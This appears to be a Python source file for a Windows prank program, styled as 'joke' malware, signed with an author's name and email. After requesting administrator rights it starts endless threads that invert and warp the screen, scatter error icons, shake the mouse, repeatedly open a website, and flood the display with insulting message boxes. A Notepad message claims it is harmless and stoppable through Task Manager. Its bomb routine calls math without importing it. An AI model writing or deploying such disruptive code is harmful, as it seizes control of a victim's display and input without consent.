import ctypes
import time
import threading
import win32gui
import win32con
import win32clipboard
import win32api
import tkinter as tk
from tkinter import messagebox
import sys
import random
import pywintypes
import subprocess
import os
import webbrowser

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_error_icon():
    # 创建错误图标
    hicon = win32gui.LoadImage(0, win32con.IDI_ERROR, win32gui.IMAGE_ICON, 0, 0, win32con.LR_SHARED)
    return hicon


def error_icon():
    try:
        while True:
            x, y = win32gui.GetCursorPos()

            # 创建错误图标
            hicon = create_error_icon()

            # 在屏幕上显示图标
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetDC(hwnd)
            win32gui.DrawIcon(hdc, x, y, hicon)
            win32gui.ReleaseDC(hwnd, hdc)

            # 释放图标句柄
            win32gui.DestroyIcon(hicon)

            time.sleep(0.03)

    except KeyboardInterrupt:
        print("Thread terminated.")


def error_icon_back():
    try:
        while True:
            # 生成随机坐标
            x = random.randint(0, win32api.GetSystemMetrics(win32con.SM_CXSCREEN))
            y = random.randint(0, win32api.GetSystemMetrics(win32con.SM_CYSCREEN))

            # 创建错误图标
            hicon = create_error_icon()

            # 在屏幕上显示图标
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetDC(hwnd)
            win32gui.DrawIcon(hdc, x, y, hicon)
            win32gui.ReleaseDC(hwnd, hdc)

            # 释放图标句柄
            win32gui.DestroyIcon(hicon)

            time.sleep(0.25)

    except KeyboardInterrupt:
        print("Thread terminated.")


def display_warning_icon():
    # 获取警告图标句柄
    hicon = win32gui.LoadImage(0, win32con.IDI_WARNING, win32con.IMAGE_ICON, 0, 0, win32con.LR_SHARED)

    try:
        while True:
            # 生成随机坐标
            x = random.randint(0, win32api.GetSystemMetrics(win32con.SM_CXSCREEN))
            y = random.randint(0, win32api.GetSystemMetrics(win32con.SM_CYSCREEN))

            # 在屏幕上显示警告图标
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetDC(hwnd)
            win32gui.DrawIcon(hdc, x, y, hicon)
            win32gui.ReleaseDC(hwnd, hdc)

            time.sleep(0.25)

    except KeyboardInterrupt:
        print("Thread terminated.")


def screen():
    try:
        while True:
            # Load gdi32.dll library
            gdi32 = ctypes.WinDLL("gdi32.dll")
            user32 = ctypes.WinDLL("user32.dll")

            # Define the enum for SRCCOPY
            SRCCOPY = 0x00CC0020

            # Get the screen width and height
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)

            # Get the desktop window handle
            desktop_window = user32.GetDesktopWindow()

            # Get the device context (DC) of the desktop window
            desktop_dc = user32.GetDC(desktop_window)

            # Create a compatible DC
            compatible_dc = gdi32.CreateCompatibleDC(desktop_dc)

            # Create a bitmap compatible with the screen DC
            bitmap = gdi32.CreateCompatibleBitmap(desktop_dc, screen_width, screen_height)

            # Select the bitmap into the compatible DC
            gdi32.SelectObject(compatible_dc, bitmap)

            # Copy the content of the desktop DC to the compatible DC (screenshot)
            gdi32.BitBlt(compatible_dc, 0, 0, screen_width, screen_height, desktop_dc, 0, 0, SRCCOPY)

            # Invert colors using BitBlt
            gdi32.BitBlt(desktop_dc, 0, 0, screen_width, screen_height, compatible_dc, 0, 0,
                         0x00550009)  # Invert operation code

            # Release resources
            gdi32.DeleteObject(bitmap)
            gdi32.DeleteDC(compatible_dc)
            user32.ReleaseDC(desktop_window, desktop_dc)
            time.sleep(1)  # Add a delay to control the loop speed

    except KeyboardInterrupt:
        print("Thread terminated.")


def shake_mouse():
    try:
        while True:
            # Generate random mouse movement with larger amplitude
            delta_x = random.randint(-7, 7)
            delta_y = random.randint(-7, 7)
            win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, delta_x, delta_y, 0, 0)
            time.sleep(0.1)  # Add a delay between mouse movements

    except KeyboardInterrupt:
        print("Thread terminated.")

def notepad():
    # 多行文本内容
    text = """This is A JOKE,
    You can run TASKMGR to stop it.
    This is not a virus!
    email:mc20111025@outlook.com
    ----------孙明昊"""

    # 将多行文本内容写入一个临时文件
    with open('temp.txt', 'w', encoding='utf-8') as file:
        file.write(text)

    # 使用记事本打开临时文件
    subprocess.run(['notepad.exe', 'temp.txt'])

    # 删除临时文件
    os.remove('temp.txt')
def open_web():
    while True:
        url = "https://www.minecraft.net"
        webbrowser.open(url)
        time.sleep(120)

def error():
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    messagebox.showwarning("LOL", "STILL USING THIS COMPUTER?")


# 复制和粘贴随机矩形
def copy_paste_random_rectangle():
    try:
        while True:
            # 生成随机坐标
            x1 = random.randint(0, 1920)  # 屏幕宽度
            y1 = random.randint(0, 1080)  # 屏幕高度

            # 生成随机矩形尺寸
            rect_width = random.randint(50, 200)
            rect_height = random.randint(50, 200)

            # 复制屏幕上的随机矩形区域
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetWindowDC(hwnd)
            mem_dc = win32gui.CreateCompatibleDC(hdc)
            mem_bitmap = win32gui.CreateCompatibleBitmap(hdc, rect_width, rect_height)
            win32gui.SelectObject(mem_dc, mem_bitmap)
            win32gui.BitBlt(mem_dc, 0, 0, rect_width, rect_height, hdc, x1, y1, win32con.SRCCOPY)

            # 生成随机目标位置
            x2 = random.randint(0, 1920 - rect_width)  # 屏幕宽度 - 矩形宽度
            y2 = random.randint(0, 1080 - rect_height)  # 屏幕高度 - 矩形高度

            # 粘贴矩形区域到目标位置
            win32gui.BitBlt(hdc, x2, y2, rect_width, rect_height, mem_dc, 0, 0, win32con.SRCCOPY)

            # 释放资源
            win32gui.DeleteObject(mem_bitmap)
            win32gui.DeleteDC(mem_dc)
            win32gui.ReleaseDC(hwnd, hdc)

            time.sleep(2)  # 等待一段时间后继续

    except KeyboardInterrupt:
        print("Thread terminated.")


def get_display_resolution():
    user32 = ctypes.windll.user32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    return screen_width, screen_height


def clone_and_scale_screen(scale_factor, hdc_screen):
    try:
        while True:
            screen_width, screen_height = get_display_resolution()

            mem_dc = win32gui.CreateCompatibleDC(hdc_screen)
            mem_bitmap = win32gui.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
            win32gui.SelectObject(mem_dc, mem_bitmap)

            try:
                win32gui.BitBlt(mem_dc, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, win32con.SRCCOPY)

                scaled_width = int(screen_width * scale_factor)
                scaled_height = int(screen_height * scale_factor)

                scaled_dc = win32gui.CreateCompatibleDC(hdc_screen)
                scaled_bitmap = win32gui.CreateCompatibleBitmap(hdc_screen, scaled_width, scaled_height)
                win32gui.SelectObject(scaled_dc, scaled_bitmap)

                win32gui.StretchBlt(scaled_dc, 0, 0, scaled_width, scaled_height, mem_dc, 0, 0, screen_width,
                                    screen_height, win32con.SRCCOPY)

                screen_center_x = screen_width // 2
                screen_center_y = screen_height // 2

                scaled_x = screen_center_x - scaled_width // 2
                scaled_y = screen_center_y - scaled_height // 2

                win32gui.BitBlt(hdc_screen, scaled_x, scaled_y, scaled_width, scaled_height, scaled_dc, 0, 0,
                                win32con.SRCCOPY)

            except pywintypes.error:
                pass

            win32gui.DeleteObject(mem_bitmap)
            win32gui.DeleteDC(mem_dc)
            win32gui.DeleteDC(scaled_dc)

            time.sleep(1)

    except KeyboardInterrupt:
        print("Thread terminated.")


def clone_outer_screen(hdc_screen):
    try:
        while True:
            screen_width, screen_height = get_display_resolution()

            mem_dc = win32gui.CreateCompatibleDC(hdc_screen)
            mem_bitmap = win32gui.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
            win32gui.SelectObject(mem_dc, mem_bitmap)

            try:
                win32gui.BitBlt(mem_dc, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, win32con.SRCCOPY)

                screen_center_x = screen_width // 2
                screen_center_y = screen_height // 2

                copy_x = screen_center_x - screen_width // 4
                copy_y = screen_center_y - screen_height // 4

                win32gui.BitBlt(mem_dc, copy_x, copy_y, screen_width // 2, screen_height // 2, mem_dc, 0, 0,
                                win32con.SRCCOPY)

            except pywintypes.error:
                pass

            win32gui.DeleteObject(mem_bitmap)
            win32gui.DeleteDC(mem_dc)

            time.sleep(1)

    except KeyboardInterrupt:
        print("Thread terminated.")

def bomb():
    class MovingMessageBox:
        def __init__(self, root, calculate_y, calculate_x, angle):
            self.root = root
            self.root.title("python NyanCat")

            self.screen_width = self.root.winfo_screenwidth()
            self.screen_height = self.root.winfo_screenheight()

            self.create_line(calculate_y, calculate_x, angle)
            self.create_message_boxes()

        def create_line(self, calculate_y, calculate_x, angle):
            self.line = []
            for i in range(self.screen_width + 1):
                if calculate_x:
                    x = calculate_x(i, self.screen_width, self.screen_height, angle)
                    y = i
                else:
                    x = i
                    y = calculate_y(i, self.screen_width, self.screen_height, angle)
                self.line.append((x, y))

        def create_message_boxes(self):
            for i, (x, y) in enumerate(self.line):
                if i % 20 == 0:
                    self.create_message_box(x, y)

        def create_message_box(self, x, y):
            message_box = tk.Toplevel(self.root)
            message_box.geometry(f"200x100+{x}+{y}")
            message_box.title("NyanCat:")

            tk.Label(message_box, text="You are SB!").pack()

    def calculate_y_diagonal_left(x, screen_width, screen_height, angle):
        radians = math.radians(angle)
        return int((screen_height - x * math.tan(radians)) * (math.cos(radians)))

    def calculate_y_diagonal_right(x, screen_width, screen_height, angle):
        radians = math.radians(angle)
        return int((screen_height - (screen_width - x) * math.tan(radians)) * (math.cos(radians)))

    def calculate_y_horizontal(x, screen_width, screen_height, angle):
        return int(screen_height * (1 - math.cos(math.radians(angle))))

    def calculate_y_top(x, screen_width, screen_height, angle):
        return 0  # Top of the screen

    def calculate_y_bottom(x, screen_width, screen_height, angle):
        return screen_height - 100  # Bottom of the screen

    def calculate_y_middle(x, screen_width, screen_height, angle):
        return int(screen_height / 2)  # Middle of the screen

    def calculate_x_vertical_top(y, screen_width, screen_height, angle):
        return 0  # Left side of the screen

    def calculate_x_vertical_center(y, screen_width, screen_height, angle):
        return int(screen_width / 2)  # Center of the screen

    def calculate_x_vertical_bottom(y, screen_width, screen_height, angle):
        return screen_width - 200  # Right side of the screen

    def run_app(calculate_y, calculate_x, angle):
        root = tk.Tk()
        app = MovingMessageBox(root, calculate_y, calculate_x, angle)
        root.mainloop()

    diagonal_angle = 30  # 更改此角度以创建对角线
    horizontal_angle = 0  # 水平线的角度
    vertical_angle = 0  # 垂直线的角度

    thread1 = threading.Thread(target=run_app, args=(calculate_y_diagonal_left, None, diagonal_angle))
    thread2 = threading.Thread(target=run_app, args=(calculate_y_diagonal_right, None, diagonal_angle))
    thread3 = threading.Thread(target=run_app, args=(calculate_y_horizontal, None, horizontal_angle))
    thread4 = threading.Thread(target=run_app, args=(calculate_y_top, None, 0))
    thread5 = threading.Thread(target=run_app, args=(calculate_y_bottom, None, 0))
    thread6 = threading.Thread(target=run_app, args=(calculate_y_middle, None, 0))
    thread7 = threading.Thread(target=run_app, args=(None, calculate_x_vertical_top, vertical_angle))
    thread8 = threading.Thread(target=run_app, args=(None, calculate_x_vertical_center, vertical_angle))
    thread9 = threading.Thread(target=run_app, args=(None, calculate_x_vertical_bottom, vertical_angle))

    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()
    thread6.start()
    thread7.start()
    thread8.start()
    thread9.start()

    thread1.join()
    thread2.join()
    thread3.join()
    thread4.join()
    thread5.join()
    thread6.join()
    thread7.join()
    thread8.join()
    thread9.join()

def main():
    try:
        screen_width, screen_height = get_display_resolution()

        hdc_screen = win32gui.GetDC(None)

        scaling_factor = 0.9
        scaling_thread = threading.Thread(target=clone_and_scale_screen, args=(scaling_factor, hdc_screen))
        scaling_thread.start()

        outer_screen_thread = threading.Thread(target=clone_outer_screen, args=(hdc_screen,))
        outer_screen_thread.start()

        while True:
            pass

    except KeyboardInterrupt:
        print("Main thread terminated.")


if __name__ == "__main__":
    if is_admin():
        # 创建并启动线程
        main_thread = threading.Thread(target=notepad)
        main_thread.start()

        main_thread = threading.Thread(target=bomb)
        main_thread.start()

        screen_thread = threading.Thread(target=open_web)
        screen_thread.start()

        screen_thread = threading.Thread(target=screen)
        screen_thread.start()

        error_icon_thread = threading.Thread(target=error_icon)
        error_icon_thread.start()

        error_icon_back_thread = threading.Thread(target=error_icon_back)
        error_icon_back_thread.start()

        warning_icon_thread = threading.Thread(target=display_warning_icon)
        warning_icon_thread.start()

        mouse_shake_thread = threading.Thread(target=shake_mouse)
        mouse_shake_thread.start()

        copy_paste_thread = threading.Thread(target=copy_paste_random_rectangle)
        copy_paste_thread.start()

        main_thread = threading.Thread(target=main)
        main_thread.start()
        while True:
            error()
            time.sleep(30)  # 在错误弹窗之间等待一段时间

    else:
        # 请求管理员权限并重新运行脚本
        if sys.version_info[0] == 3:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            print("run again...")
        else:
            ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)